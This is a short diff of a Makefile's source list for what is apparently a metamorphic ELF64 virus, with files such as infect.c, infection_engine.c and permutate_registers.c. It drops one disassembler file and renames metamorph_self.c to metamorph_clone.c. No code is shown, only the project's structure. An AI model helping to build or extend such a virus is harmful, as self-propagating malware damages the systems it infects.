@@ -28,7 +28,6 @@ SRC =	loader.s                       \
 	virus/disasm_block.c           \
 	virus/disasm_jumps.c           \
 	virus/disasm_length.c          \
-	virus/disasm_operands.c        \
 	virus/elf64_iterators.c        \
 	virus/file_iterator.c          \
 	virus/find_entry.c             \
@@ -36,7 +35,7 @@ SRC =	loader.s                       \
 	virus/infect.c                 \
 	virus/infection_engine.c       \
 	virus/log.c                    \
-	virus/metamorph_self.c         \
+	virus/metamorph_clone.c        \
 	virus/permutate_blocks.c       \
 	virus/permutate_registers.c    \
 	virus/random.c                 \
